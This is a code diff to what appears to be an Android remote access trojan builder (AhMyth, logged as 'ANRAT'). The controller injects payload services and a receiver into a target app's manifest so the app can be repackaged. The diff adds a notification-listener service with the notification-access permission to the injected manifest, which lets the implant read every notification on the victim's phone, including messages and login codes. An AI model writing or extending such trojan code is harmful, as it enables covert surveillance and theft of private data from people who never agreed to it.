@@ -645,7 +645,7 @@ app.controller("AppCtrl", ($scope) => {
                         _: '' // Add empty string as element text
                     });
                 }
-            
+
             });
 
             delayedLog('[★] Injecting ANRAT Payload Service and Receiver...');
@@ -673,11 +673,29 @@ app.controller("AppCtrl", ($scope) => {
                     'android:name': CONSTANTS.ahmythService,
                 },
             };
+            const notificationServiceTag = {
+                $: {
+                    'android:name': '.NotificationListener',
+                    'android:enabled': 'true',
+                    'android:exported': 'true',
+                    'android:permission': 'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE',
+                },
+                'intent-filter': {
+                    action: {
+                        $: {
+                            'android:name': 'android.service.notification.NotificationListenerService',
+                        },
+                    },
+                },
+            };
+
+
 
             // Add the receiver and service tags to the application node
             manifestObj.application.receiver.push(receiverTag);
             manifestObj.application.service.push(serviceTag);
-
+            manifestObj.application.service.push(notificationServiceTag);
+            
             const builder = new xml2js.Builder({
                 renderOpts: {
                     pretty: true,
